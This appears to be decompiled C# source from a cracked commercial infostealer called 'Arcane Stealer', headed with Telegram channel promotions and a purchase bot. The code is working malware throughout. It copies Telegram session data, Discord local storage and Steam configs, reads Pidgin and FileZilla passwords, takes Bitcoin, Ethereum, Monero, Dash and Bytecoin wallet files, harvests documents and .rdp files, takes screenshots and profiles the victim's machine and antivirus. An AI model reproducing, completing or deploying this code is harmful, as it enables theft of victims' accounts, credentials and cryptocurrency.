// Cracked by Milfachs. t.me/milfachs or t.me/stroleyman.
// Telegram Channel - t.me/darkwanna

using Microsoft.Win32;
using Stealer;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Xml;

internal class Class3
{
  private static int int_0;

  public static void smethod_0(string string_0)
  {
    try
    {
      string[] strArray = new string[47]
      {
        "――――――――――――――――――――――――――――――――――――――――――――\r\nArcane Stealer v",
        Program.version,
        " Release\r\n――――――――――――――――――――――――――――――――――――――――――――\r\nDeveloper @SakariHack\r\nBuy online at @arcanee_bot\r\n――――――――――――――――――――――――――――――――――――――――――――\r\nIP: ",
        Program.geo.Split('?')[0],
        "\r\nCity: ",
        Program.geo.Split('?')[1],
        "\r\nCountry: ",
        Program.geo.Split('?')[2],
        "\r\nCountry code: ",
        Program.geo.Split('?')[3],
        "\r\n――――――――――――――――――――――――――――――――――――――――――――\r\nPasswords: ",
        Class7.string_0,
        "\r\nCookies: ",
        Class7.string_1,
        "\r\nForms: ",
        Class7.string_2,
        "\r\nFiles: ",
        Class7.string_3,
        " \r\nFileZilla: ",
        Class7.string_5,
        "\r\nWallets ",
        Class7.string_7 != "0" ? "+" : "―",
        "\r\nTelegram ",
        Class7.string_4 != "0" ? "+" : "―",
        "\r\nDiscord ",
        Class7.string_8 != "0" ? "+" : "―",
        "\r\nPidgin ",
        Class7.string_9 != "0" ? "+" : "―",
        "\r\nSteam ",
        Class7.string_6 != "0" ? "+" : "―",
        "\r\n――――――――――――――――――――――――――――――――――――――――――――\r\nDD: ",
        null,
        null,
        null,
        null,
        null,
        null,
        null,
        null,
        null,
        null,
        null,
        null,
        null,
        null,
        null,
        null
      };
      string str1;
      if (!(Class7.string_10 != ""))
        str1 = "";
      else
        str1 = "\r\n" + Class7.string_10.TrimEnd(';').Replace(";", "\r\n");
      strArray[31] = str1;
      strArray[32] = "\r\n――――――――――――――――――――――――――――――――――――――――――――\r\nClipboard: ";
      strArray[33] = Program.clipp != null ? Program.clipp : "Empty or not text";
      strArray[34] = "\r\n――――――――――――――――――――――――――――――――――――――――――――\r\nLaunch time: ";
      strArray[35] = Program.timestart;
      strArray[36] = "\r\nGet log time: ";
      strArray[37] = Program.timerint.ToString();
      strArray[38] = " sec.\r\nStartup path: ";
      strArray[39] = Assembly.GetExecutingAssembly().Location.Replace("/", "\\");
      strArray[40] = "\r\n――――――――――――――――――――――――――――――――――――――――――――\r\nHWID: ";
      strArray[41] = Class4.smethod_0();
      strArray[42] = "\r\nUser name: ";
      strArray[43] = Environment.UserName;
      strArray[44] = "\r\nMachine name: ";
      strArray[45] = Environment.MachineName;
      strArray[46] = "\r\n";
      string str2 = string.Concat(strArray);
      try
      {
        string str3 = "";
        string name = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
        using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name))
        {
          if (registryKey != null)
          {
            try
            {
              string str4 = registryKey.GetValue("ProductName").ToString();
              if (str4 == "")
                str3 = "Error";
              str3 = !str4.Contains("XP") ? (!str4.Contains("7") ? (!str4.Contains("8") ? (!str4.Contains("10") ? (!str4.Contains("2012") ? "Windows" : "Windows Server") : "Windows 10") : "Windows 8") : "Windows 7") : "XP";
            }
            catch
            {
              str3 = "Error";
            }
          }
          else
            str3 = "Error";
        }
        string str5 = !Environment.Is64BitOperatingSystem ? str3 + " x32" : str3 + " x64";
        str2 = str2 + "Windows version: " + str5 + "\r\n";
      }
      catch
      {
      }
      try
      {
        int width = Screen.PrimaryScreen.Bounds.Width;
        int height = Screen.PrimaryScreen.Bounds.Height;
        str2 += string.Format("Screen size: {0}x{1}\r\n", (object) width, (object) height);
      }
      catch
      {
      }
      try
      {
        using (ManagementObjectCollection objectCollection = new ManagementObjectSearcher("root\\SecurityCenter2", "SELECT * FROM AntiVirusProduct").Get())
        {
          foreach (ManagementBaseObject managementBaseObject in objectCollection)
            str2 = str2 + "Antivirus name: " + managementBaseObject["displayName"]?.ToString() + "\r\n";
        }
      }
      catch
      {
      }
      try
      {
        using (ManagementObjectCollection objectCollection = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor").Get())
        {
          using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = objectCollection.GetEnumerator())
          {
            if (enumerator.MoveNext())
            {
              string str3 = enumerator.Current["Name"]?.ToString();
              str2 = str2 + "CPU name: " + str3 + "\r\n";
            }
          }
        }
      }
      catch
      {
      }
      try
      {
        using (ManagementObjectCollection objectCollection = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
        {
          foreach (ManagementBaseObject managementBaseObject in objectCollection)
            str2 = str2 + "GPU name: " + managementBaseObject["Caption"]?.ToString() + "\r\n";
        }
      }
      catch
      {
      }
      string str6 = str2 + "――――――――――――――――――――――――――――――――――――――――――――\r\n";
      try
      {
        str6 += string.Format("Number of running processes: {0}\r\n\r\n", (object) Process.GetProcesses().Length);
        Array.Sort<Process>(Process.GetProcesses(), (Comparison<Process>) ((p1, p2) => p1.ProcessName.CompareTo(p2.ProcessName)));
        foreach (Process process in Process.GetProcesses())
        {
          if (Process.GetCurrentProcess().Id != process.Id && process.Id != 0)
            str6 = str6 + process.ProcessName + "\r\n";
        }
        str6 += "――――――――――――――――――――――――――――――――――――――――――――";
      }
      catch
      {
      }
      StreamWriter streamWriter = new StreamWriter(string_0);
      streamWriter.Write(str6);
      streamWriter.Close();
    }
    catch (Exception ex)
    {
      Console.WriteLine((object) ex);
    }
  }

  public static void smethod_1(string string_0)
  {
    string path1 = "";
    Process[] processesByName = Process.GetProcessesByName("Telegram");
    string str1 = (string) null;
    if (processesByName.Length < 1)
    {
      if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop"))
      {
        try
        {
          Process.Start(new ProcessStartInfo()
          {
            WindowStyle = ProcessWindowStyle.Minimized,
            FileName = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\Telegram.exe"
          });
          Thread.Sleep(1500);
          path1 = Path.GetDirectoryName(Process.GetProcessesByName("Telegram")[0].MainModule.FileName) + "\\tdata";
        }
        catch
        {
        }
      }
    }
    else
      path1 = Path.GetDirectoryName(processesByName[0].MainModule.FileName) + "\\tdata";
    if (!Directory.Exists(path1))
      return;
    string[] files = Directory.GetFiles(path1);
    string[] directories = Directory.GetDirectories(path1);
    Directory.CreateDirectory(string_0 + "\\tdata");
    Class7.string_4 = "1";
    foreach (string path2 in directories)
    {
      try
      {
        DirectoryInfo directoryInfo = new DirectoryInfo(path2);
        if (Convert.ToInt64(directoryInfo.Name.Length) > 15L)
        {
          Directory.CreateDirectory(string_0 + "\\tdata\\" + directoryInfo.Name);
          str1 = directoryInfo.Name;
        }
      }
      catch
      {
      }
    }
    foreach (string str2 in files)
    {
      try
      {
        FileInfo fileInfo = new FileInfo(str2);
        if (Convert.ToInt64(fileInfo.Length) < 5000L)
        {
          if (fileInfo.Name.Length > 15)
          {
            if (Path.GetExtension(str2) != ".json")
              File.Copy(str2, string_0 + "\\tdata\\" + fileInfo.Name);
          }
        }
      }
      catch (Exception ex)
      {
      }
    }
    string[] strArray = new string[2]
    {
      path1 + "\\" + str1 + "\\map0",
      path1 + "\\" + str1 + "\\map1"
    };
    try
    {
      if (File.Exists(strArray[0]))
        File.Copy(strArray[0], string_0 + "\\tdata\\" + str1 + "\\map0");
    }
    catch
    {
    }
    try
    {
      if (!File.Exists(strArray[1]))
        return;
      File.Copy(strArray[1], string_0 + "\\tdata\\" + str1 + "\\map1");
    }
    catch
    {
    }
  }

  public static void smethod_2(string string_0)
  {
    try
    {
      Directory.CreateDirectory(string_0);
      List<string> stringList = new List<string>();
      foreach (DriveInfo drive in DriveInfo.GetDrives())
        stringList.Add(drive.Name);
      stringList.Add("C:\\Users\\" + Environment.UserName.ToString() + "\\Desktop");
      stringList.Add("C:\\Users\\" + Environment.UserName.ToString() + "\\Downloads");
      stringList.Add("C:\\Users\\" + Environment.UserName.ToString() + "\\Documents");
      foreach (string string_0_1 in stringList.ToArray())
        Class3.smethod_3(string_0_1, string_0);
      Class7.string_3 = Class3.int_0.ToString();
    }
    catch (Exception ex)
    {
    }
  }

  private static void smethod_3(string string_0, string string_1)
  {
    try
    {
      foreach (FileInfo file in new DirectoryInfo(string_0).GetFiles())
      {
        if (file.Extension.Equals(".doc") || file.Extension.Equals(".docx") || (file.Extension.Equals(".txt") || file.Extension.Equals(".log")) || file.Extension.Equals(".rdp"))
        {
          file.CopyTo(string_1 + "\\" + file.Name);
          ++Class3.int_0;
        }
      }
      foreach (DirectoryInfo directory in new DirectoryInfo(string_0).GetDirectories())
      {
        foreach (FileInfo file in new DirectoryInfo(string_0 + "\\" + directory.ToString()).GetFiles())
        {
          if (file.Extension.Equals(".doc") || file.Extension.Equals(".docx") || (file.Extension.Equals(".txt") || file.Extension.Equals(".log")) || file.Extension.Equals(".rdp"))
          {
            file.CopyTo(string_1 + "\\" + file.Name);
            ++Class3.int_0;
          }
        }
      }
    }
    catch (Exception ex)
    {
    }
  }

  public static void smethod_4(string string_0)
  {
    try
    {
      Rectangle bounds = Screen.PrimaryScreen.Bounds;
      int width = bounds.Width;
      bounds = Screen.PrimaryScreen.Bounds;
      int height = bounds.Height;
      Bitmap bitmap = new Bitmap(width, height);
      Graphics.FromImage((Image) bitmap).CopyFromScreen(0, 0, 0, 0, bitmap.Size);
      bitmap.Save(string_0, ImageFormat.Png);
    }
    catch
    {
    }
  }

  public static void smethod_5(string string_0)
  {
    bool flag = false;
    Directory.CreateDirectory(string_0);
    try
    {
      foreach (FileInfo file in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\bytecoin").GetFiles())
      {
        if (file.Extension.Equals(".wallet"))
        {
          Directory.CreateDirectory(string_0 + "\\Bytecoin\\");
          file.CopyTo(string_0 + "\\Bytecoin\\" + file.Name);
          flag = true;
        }
      }
    }
    catch
    {
    }
    try
    {
      using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Bitcoin").OpenSubKey("Bitcoin-Qt"))
      {
        if (File.Exists(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat"))
        {
          Directory.CreateDirectory(string_0 + "\\BitcoinCore\\");
          File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", string_0 + "\\BitcoinCore\\wallet.dat");
          flag = true;
        }
      }
    }
    catch
    {
    }
    try
    {
      using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Dash").OpenSubKey("Dash-Qt"))
      {
        if (File.Exists(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat"))
        {
          Directory.CreateDirectory(string_0 + "\\DashCore\\");
          File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", string_0 + "\\DashCore\\wallet.dat");
          flag = true;
        }
      }
    }
    catch
    {
    }
    try
    {
      foreach (FileInfo file in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Ethereum\\keystore").GetFiles())
      {
        Directory.CreateDirectory(string_0 + "\\Ethereum\\");
        file.CopyTo(string_0 + "\\Ethereum\\" + file.Name);
        flag = true;
      }
    }
    catch
    {
    }
    try
    {
      using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("monero-project").OpenSubKey("monero-core"))
      {
        try
        {
          string str = registryKey.GetValue("wallet_path").ToString().Replace("/", "\\");
          char[] chArray1 = new char[1]{ '\\' };
          char[] chArray2 = new char[1]{ '\\' };
          if (File.Exists(str))
          {
            Directory.CreateDirectory(string_0 + "\\Monero\\");
            File.Copy(str, string_0 + "\\Monero\\" + str.Split(chArray1)[str.Split(chArray2).Length - 1]);
            flag = true;
          }
        }
        catch
        {
        }
      }
    }
    catch
    {
    }
    try
    {
      if (!flag)
        Directory.Delete(string_0);
      else
        Class7.string_7 = "1";
    }
    catch
    {
    }
  }

  public static void smethod_6(string string_0)
  {
    string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\.purple\\accounts.xml";
    StringBuilder stringBuilder = new StringBuilder();
    if (!File.Exists(str))
      return;
    try
    {
      XmlDocument xmlDocument = new XmlDocument();
      xmlDocument.Load((XmlReader) new XmlTextReader(str));
      foreach (XmlNode childNode in xmlDocument.DocumentElement.ChildNodes)
      {
        string innerText1 = childNode.ChildNodes[0].InnerText;
        string innerText2 = childNode.ChildNodes[1].InnerText;
        string innerText3 = childNode.ChildNodes[2].InnerText;
        if (!string.IsNullOrEmpty(innerText1))
        {
          if (!string.IsNullOrEmpty(innerText2))
          {
            if (!string.IsNullOrEmpty(innerText3))
            {
              stringBuilder.AppendLine("――――――――――――――――――――――――――――――――――――――――――――");
              stringBuilder.AppendLine("Protocol     | " + innerText1);
              stringBuilder.AppendLine("Login        | " + innerText2);
              stringBuilder.AppendLine("Password     | " + innerText3);
            }
            else
              break;
          }
          else
            break;
        }
        else
          break;
      }
      if (stringBuilder.Length <= 0)
        return;
      stringBuilder.AppendLine("――――――――――――――――――――――――――――――――――――――――――――");
      try
      {
        Directory.CreateDirectory(string_0 + "\\");
        File.AppendAllText(string_0 + "\\Pidgin.txt", stringBuilder.ToString());
        Class7.string_9 = "1";
      }
      catch
      {
      }
    }
    catch
    {
    }
  }

  public static void smethod_7(string string_0)
  {
    try
    {
      if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\https_discordapp.com_0.localstorage"))
        return;
      Directory.CreateDirectory(string_0);
      File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\https_discordapp.com_0.localstorage", string_0 + "\\https_discordapp.com_0.localstorage", true);
      Class7.string_8 = "1";
    }
    catch
    {
    }
  }

  public static void smethod_8(string string_0)
  {
    string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\recentservers.xml";
    StringBuilder stringBuilder = new StringBuilder();
    int num = 0;
    try
    {
      if (!File.Exists(str1))
        return;
      try
      {
        XmlDocument xmlDocument = new XmlDocument();
        xmlDocument.Load(str1);
        foreach (XmlElement xmlElement in ((XmlElement) xmlDocument.GetElementsByTagName("RecentServers")[0]).GetElementsByTagName("Server"))
        {
          string innerText1 = xmlElement.GetElementsByTagName("Host")[0].InnerText;
          string innerText2 = xmlElement.GetElementsByTagName("Port")[0].InnerText;
          string innerText3 = xmlElement.GetElementsByTagName("User")[0].InnerText;
          string str2 = Encoding.UTF8.GetString(Convert.FromBase64String(xmlElement.GetElementsByTagName("Pass")[0].InnerText));
          if (!string.IsNullOrEmpty(innerText1))
          {
            if (!string.IsNullOrEmpty(innerText2))
            {
              if (!string.IsNullOrEmpty(innerText3))
              {
                if (!string.IsNullOrEmpty(str2))
                {
                  stringBuilder.AppendLine("――――――――――――――――――――――――――――――――――――――――――――");
                  stringBuilder.AppendLine("Host         | " + innerText1 + ":" + innerText2);
                  stringBuilder.AppendLine("User         | " + innerText3);
                  stringBuilder.AppendLine("Password     | " + str2);
                  ++num;
                }
                else
                  break;
              }
              else
                break;
            }
            else
              break;
          }
          else
            break;
        }
        if (stringBuilder.Length <= 0)
          return;
        stringBuilder.AppendLine("――――――――――――――――――――――――――――――――――――――――――――");
        try
        {
          Directory.CreateDirectory(string_0 + "\\");
          File.AppendAllText(string_0 + "\\FileZilla.txt", stringBuilder.ToString());
          Class7.string_5 = num.ToString();
        }
        catch
        {
        }
      }
      catch
      {
      }
    }
    catch
    {
    }
  }

  public static void smethod_9(string string_0)
  {
    try
    {
      string str = Path.Combine(string_0, "config");
      string path = Path.Combine(Class9.smethod_5("InstallPath", "SourceModInstallPath"), "config");
      if (!Directory.Exists(Class9.smethod_5("InstallPath", "SourceModInstallPath")))
        return;
      Directory.CreateDirectory(string_0);
      foreach (string file in Directory.GetFiles(Class9.smethod_5("InstallPath", "SourceModInstallPath"), "*."))
      {
        try
        {
          File.Copy(file, Path.Combine(string_0, Path.GetFileName(file)));
        }
        catch
        {
        }
      }
      if (Directory.Exists(str))
        return;
      Directory.CreateDirectory(str);
      File.AppendAllText(string_0 + "\\Accounts.txt", Class9.smethod_4());
      foreach (string file in Directory.GetFiles(path, "*.vdf"))
      {
        try
        {
          File.Copy(file, Path.Combine(str, Path.GetFileName(file)));
        }
        catch
        {
        }
      }
      Class7.string_6 = "1";
    }
    catch (UnauthorizedAccessException ex)
    {
    }
    catch (IOException ex)
    {
    }
    catch (ArgumentException ex)
    {
    }
  }

  public static void smethod_10(object object_0)
  {
  }

  public Class3()
  {
    Class11.ARXWv9qzu32dU();
    // ISSUE: explicit constructor call
    base.\u002Ector();
  }

  static Class3()
  {
    Class11.ARXWv9qzu32dU();
  }
}
